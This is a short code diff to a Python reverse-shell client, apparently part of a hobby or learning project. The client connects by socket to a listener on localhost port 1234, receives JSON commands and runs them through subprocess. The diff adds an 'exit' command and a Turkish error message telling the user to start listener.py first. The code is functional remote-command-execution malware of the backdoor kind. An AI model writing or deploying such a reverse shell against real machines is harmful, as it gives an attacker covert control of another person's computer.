@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess as su
 import os
+from sys import exit
 
 def j_send(data):
     jsondata = json.dumps(data)
@@ -23,7 +24,7 @@ def shell():
     while True:
         command = j_recv()
 
-        if command == 'quit':
+        if command == 'quit' or command == "exit":
             break
 
         elif command[:3] == 'cd ':
@@ -35,5 +36,9 @@ def shell():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(('127.0.0.1', 1234))
+try:
+    sock.connect(('127.0.0.1', 1234))
+except ConnectionRefusedError:
+    print("Hatta: Lütfen önce listener.py dosyasını çalıştırın!")
+    exit()
 shell()
